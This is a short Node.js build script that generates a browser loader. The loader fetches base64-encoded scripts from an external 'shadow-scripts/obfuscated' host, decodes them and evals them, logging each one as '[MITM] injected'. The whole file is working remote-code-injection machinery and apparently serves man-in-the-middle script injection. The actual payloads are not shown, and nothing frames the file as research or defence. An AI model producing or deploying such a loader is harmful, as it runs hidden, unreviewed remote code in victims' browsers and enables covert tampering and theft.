// scripts/gen-mitm-loader.js
// Build-time utility: create apps/loader/public/scripts/mitm-loader.js
// It simply fetches every *.js.b64 listed in manifest.json, decodes, evals.

const fs   = require('fs');
const path = require('path');

const ROOT        = path.resolve(__dirname, '..');
const MANIFEST_IN = path.join(ROOT, 'apps/loader/public/manifest.json');
const OUT_DIR     = path.join(ROOT, 'apps/loader/public/scripts');
const OUT_FILE    = path.join(OUT_DIR, 'mitm-loader.js');

if (!fs.existsSync(MANIFEST_IN)) {
  throw new Error('manifest.json missing – run build-all.sh manifest step first');
}
const manifest = JSON.parse(fs.readFileSync(MANIFEST_IN, 'utf8'));

const code = `
// Auto-generated: DO NOT EDIT
(async () => {
  const files = ${JSON.stringify(manifest, null, 2)};
  const base  = 'https://popdeuxrem.github.io/shadow-scripts/obfuscated/';
  for (const f of files) {
    try {
      const res = await fetch(base + f);
      const b64 = await res.text();
      /* eslint-disable no-eval */
      eval(atob(b64.trim()));
      /* eslint-enable  no-eval */
      console.log('[MITM] injected', f);
    } catch (e) {
      console.error('[MITM] failed', f, e);
    }
  }
})();
`;

fs.mkdirSync(OUT_DIR, { recursive: true });
fs.writeFileSync(OUT_FILE, code.trim() + '\n');
console.log('✓ mitm-loader.js generated');
